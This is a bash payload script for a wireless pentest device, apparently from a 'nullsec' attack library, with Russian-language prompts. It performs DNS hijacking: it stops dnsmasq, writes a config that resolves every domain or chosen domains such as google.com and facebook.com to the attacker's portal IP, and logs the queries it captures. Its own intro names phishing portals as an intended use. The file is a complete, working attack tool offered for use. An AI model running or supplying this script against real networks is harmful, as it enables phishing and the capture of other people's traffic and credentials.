#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: DNS Hijack
# Author: bad-antics
# Description: Перенаправление DNS-запросов для захвата порталов
# Category: nullsec/attack

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# В случае отсутствия подключенного интерфейса показывает диалог ошибки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "DNS HIJACK

Перехват DNS-запросов
и перенаправление на
пользовательские адреса.

Идеально для:
- Фишинговых порталов
- Анализа трафика
- Сетевых розыгрышей

Нажмите OK для продолжения."

INTERFACE="$IFACE"

PROMPT "РЕЖИМ ПЕРЕХВАТА:

1. Весь трафик → Портал
2. Определенные домены
3. Пользовательские переадресации

Выберите режим." 

HIJACK_MODE=$(NUMBER_PICKER "Режим (1-3):" 1)

PORTAL_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
PORTAL_IP=${PORTAL_IP:-192.168.1.1}

case $HIJACK_MODE in
    1) # All traffic
        DNS_ENTRIES="address=/#/$PORTAL_IP"
        PROMPT "РЕЖИМ ВСЕГО ТРАФИКА

Каждый DNS-запрос будет
перенаправлен на портал:
$PORTAL_IP

Нажмите OK для продолжения."
        ;;
        
    2) # Specific domains
        PROMPT "ПЕРЕХВАТ ДОМЕНОВ

Введите домены для перехвата
через пробел.

Пример: google.com
facebook.com twitter.com"
        
        DOMAINS=$(TEXT_PICKER "Домены:" "google.com facebook.com")
        
        DNS_ENTRIES=""
        for DOMAIN in $DOMAINS; do
            DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${PORTAL_IP}\n"
        done
        ;;
        
    3) # Custom redirects
        PROMPT "ПОЛЬЗОВАТЕЛЬСКИЕ ПЕРЕНАПРАВЛЕНИЯ

Будет запрошен каждый
dомен и его адрес.

Нажмите OK для настройки."
        
        DNS_ENTRIES=""
        for i in 1 2 3; do
            DOMAIN=$(TEXT_PICKER "Домен $i:" "")
            if [ -n "$DOMAIN" ]; then
                TARGET=$(TEXT_PICKER "Перенаправить на IP:" "$PORTAL_IP")
                DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${TARGET}\n"
            fi
        done
        ;;
esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ DNS HIJACK?

Это перехватит
DNS-трафик.

Убедитесь, что портал
запущен.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Запуск DNS Hijack..."
SPINNER_START "Перехват DNS..."

# Остановить существующий dnsmasq
killall dnsmasq 2>/dev/null

# Создать конфигурацию dnsmasq
cat > /tmp/dnsmasq_hijack.conf << DNSMASQ_EOF
interface=$INTERFACE
no-dhcp-interface=$INTERFACE
bind-interfaces
no-resolv
$(echo -e "$DNS_ENTRIES")
DNSMASQ_EOF

# Настроить интерфейс
ifconfig $INTERFACE $PORTAL_IP netmask 255.255.255.0 up

# Запустить перехваченный DNS
dnsmasq -C /tmp/dnsmasq_hijack.conf --log-queries --log-facility=/mmc/nullsec/dns_log.txt &
DNSMASQ_PID=$!

PROMPT "DNS HIJACK АКТИВЕН!

IP портала: $PORTAL_IP
Режим: $HIJACK_MODE

Запросы записываются в:
/mmc/nullsec/dns_log.txt

Нажмите OK для просмотра..."

# Цикл мониторинга
DURATION=$(NUMBER_PICKER "Время работы (мин):" 10)
sleep $((DURATION * 60))

SPINNER_STOP

# Очистка
kill $DNSMASQ_PID 2>/dev/null
rm /tmp/dnsmasq_hijack.conf 2>/dev/null

QUERY_COUNT=$(wc -l < /mmc/nullsec/dns_log.txt 2>/dev/null || echo 0)

PROMPT "DNS HIJACK ОСТАНОВЛЕН

Длительность: ${DURATION}м
Записано запросов: $QUERY_COUNT

Проверьте dns_log.txt
для захваченных запросов.

Нажмите OK для выхода."
